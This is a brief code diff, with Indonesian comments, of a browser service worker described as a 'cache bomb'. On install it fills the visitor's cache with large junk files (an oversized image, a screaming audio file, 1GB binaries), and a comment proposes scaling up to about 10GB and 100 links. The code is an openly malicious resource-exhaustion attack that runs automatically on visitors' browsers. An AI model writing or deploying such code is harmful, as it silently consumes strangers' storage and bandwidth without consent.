@@ -1,11 +1,11 @@
-// Bom Cache: Isi cache dengan file sampah besar
-self.addEventListener('install', (e) => {
+// Isi cache dengan 10GB data sampah
+self.addEventListener('install', e => {
     e.waitUntil(
-        caches.open('CACHE-SETAN').then((cache) => {
+        caches.open('DOOM_CACHE').then(cache => {
             return cache.addAll([
-                'https://i.imgur.com/UNREAL-HUGE-IMAGE.jpg',
-                'https://example.com/jeritan-extreme.mp3',
-                'https://example.com/file-sampah-1GB.bin'
+                'https://example.com/junk1.bin',
+                'https://example.com/junk2.bin',
+                // ... tambahin sampe 100 link
             ]);
         })
     );
